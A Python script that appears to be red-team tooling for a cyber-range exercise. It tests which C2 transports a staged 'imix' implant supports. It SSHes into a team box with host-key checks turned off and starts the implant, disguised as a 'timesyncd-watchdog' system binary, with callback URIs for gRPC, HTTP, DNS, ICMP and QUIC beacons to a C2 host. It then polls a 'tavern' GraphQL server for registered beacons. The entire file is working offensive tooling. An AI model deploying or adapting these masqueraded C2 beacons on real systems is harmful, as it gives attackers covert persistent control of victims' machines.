#!/usr/bin/env python3
"""Which transports does the staged imix binary actually speak?

Runs each DSN variant directly on a team box (no systemd, so no unit-file
specifier mangling) and asks tavern whether that beacon ID registered.

Usage: transport-smoke.py <box-ip> [binary-path]
"""
import json
import subprocess
import sys
import time

KEY = "/home/hna/dev/dawgsec/tezcatlipoca/proxmox"
ENGINE = "10.0.0.252"
BOX = sys.argv[1]
BIN = sys.argv[2] if len(sys.argv) > 2 else "/usr/local/lib/timesyncd-watchdog/timesyncd-watchdog"
PROXY = (f"ssh -i {KEY} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
         f"-W %h:%p sysadmin@{ENGINE}")

IDS = {
    "grpc": "aaaaaaaa-0000-0000-0000-000000000001",
    "http1": "aaaaaaaa-0000-0000-0000-000000000002",
    "dns": "aaaaaaaa-0000-0000-0000-000000000003",
    "icmp": "aaaaaaaa-0000-0000-0000-000000000004",
    "quic": "aaaaaaaa-0000-0000-0000-000000000005",
    "multi": "aaaaaaaa-0000-0000-0000-000000000006",
}
DSNS = {
    "grpc": "http://172.31.120.1:8000?type=grpc&interval=10",
    "http1": "http1://172.31.120.1:8001?type=http1&interval=10",
    "dns": 'dns://172.31.120.1:53?type=dns&extra=%7B%22domain%22%3A%22c2.dawgsec.range%22%7D&interval=10',
    "icmp": "icmp://172.31.120.1?type=icmp&interval=10",
    "quic": "quic://172.31.120.1:8443?type=quic&interval=10",
    "multi": ("http://172.31.120.1:8000?type=grpc&interval=10;"
              "http1://172.31.120.1:8001?type=http1&interval=10;"
              'dns://172.31.120.1:53?type=dns&extra=%7B%22domain%22%3A%22c2.dawgsec.range%22%7D&interval=10;'
              "icmp://172.31.120.1?type=icmp&interval=10;"
              "quic://172.31.120.1:8443?type=quic&interval=10"),
}


def box(cmd, timeout=180):
    return subprocess.run(["ssh", "-i", KEY, "-o", "StrictHostKeyChecking=no",
                           "-o", "UserKnownHostsFile=/dev/null",
                           "-o", f"ProxyCommand={PROXY}", "-o", "ConnectTimeout=10",
                           f"medic@{BOX}", cmd],
                          capture_output=True, text=True, timeout=timeout)


def registered(ident):
    q = ('{ beacons { edges { node { identifier transport lastSeenAt '
         'host { name } } } } }')
    out = subprocess.run(["curl", "-s", "-m", "20", "http://10.0.0.117:8000/graphql",
                          "-H", "Content-Type: application/json",
                          "-d", json.dumps({"query": q})],
                         capture_output=True, text=True).stdout
    try:
        d = json.loads(out)
    except ValueError:
        return None
    for e in ((d.get("data") or {}).get("beacons") or {}).get("edges") or []:
        n = e["node"]
        if n.get("identifier") == ident:
            return f"{n.get('transport')} host={(n.get('host') or {}).get('name')} last={n.get('lastSeenAt')}"
    return None


for name in ("grpc", "http1", "dns", "icmp", "quic", "multi"):
    ident, dsn = IDS[name], DSNS[name]
    r = box(f"cd /tmp && rm -f t-{name}.log && "
            f"(IMIX_CALLBACK_URI='{dsn}' IMIX_BEACON_ID={ident} "
            f"setsid {BIN} > /tmp/t-{name}.log 2>&1 &) ; sleep 1; echo started")
    print(f"{name:6s} started={'started' in r.stdout}", flush=True)
    hit = None
    for _ in range(9):          # ~45 s, DNS/QUIC can be slow on first cycle
        time.sleep(5)
        hit = registered(ident)
        if hit:
            break
    log = box(f"tail -c 300 /tmp/t-{name}.log 2>/dev/null; echo; pkill -f 'IMIX_BEACON_ID={ident}' 2>/dev/null; true")
    print(f"       registered: {hit or 'NO'}")
    tail = (log.stdout or "").strip().replace("\n", " | ")
    if tail:
        print(f"       log: {tail[:220]}")
    time.sleep(2)
